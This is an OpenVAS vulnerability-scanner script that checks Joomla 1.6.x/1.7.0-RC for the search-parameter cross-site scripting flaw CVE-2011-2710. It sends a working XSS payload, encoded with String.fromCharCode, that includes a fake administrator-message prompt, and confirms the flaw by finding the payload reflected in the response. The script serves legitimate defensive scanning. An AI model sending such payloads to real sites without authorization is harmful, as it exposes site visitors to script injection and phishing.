##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_mult_xss_vuln_jul11.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla! CMS Multiple Cross Site Scripting Vulnerabilities - July 2011
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application.";
tag_affected = "Joomla CMS versions 1.6.x and 1.7.0-RC.";
tag_insight = "Multiple flaws are caused by improper validation of user-supplied input via
  multiple parameters to 'index.php', which allows attackers to execute
  arbitrary HTML and script code on the web server.";
tag_solution = "Upgrade to Joomla CMS 1.7.0 or later.
  For updates refer to http://www.joomla.org/";
tag_summary = "This host is running Joomla and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(902541);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-27 14:47:11 +0200 (Wed, 27 Jul 2011)");
  script_cve_id("CVE-2011-2710");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Joomla! CMS Multiple Cross Site Scripting Vulnerabilities - July 2011");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Jul/271");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2011/07/22/5");
  script_xref(name : "URL" , value : "http://bl0g.yehg.net/2011/07/joomla-170-rc-and-lower-multiple-cross.html");

  script_description(desc);
  script_summary("Check if Joomla CMS is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Joomla Directory
if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

## Construct the Attack Request
attack = string("task=search&Itemid=435&searchword=Search';onunload=function()",
                "{x=confirm(String.fromCharCode(89,111,117,39,118,101,32,103,",
                "111,116,32,97,32,109,101,115,115,97,103,101,32,102,114,111,",
                "109,32,65,100,109,105,110,105,115,116,114,97,116,111,114,33,",
                "10,68,111,32,121,111,117,32,119,97,110,116,32,116,111,32,103,",
                "111,32,116,111,32,73,110,98,111,120,63));alert(String.from",
                "CharCode(79,112,101,110,86,65,83,45,88,83,83,45,84,101,115,",
                "116));};//xsssssssssss&option=com_search");

req = string("POST ", dir, "/index.php HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "User-Agent: MSIE 8.0\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(attack), "\r\n\r\n", attack);

## Try XSS Attack
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
  (';alert(String.fromCharCode(79,112,101,110,86,65,83,45,88,83,83,45,' +
   '84,101,115,116));' >< res)){
  security_warning(port);
}
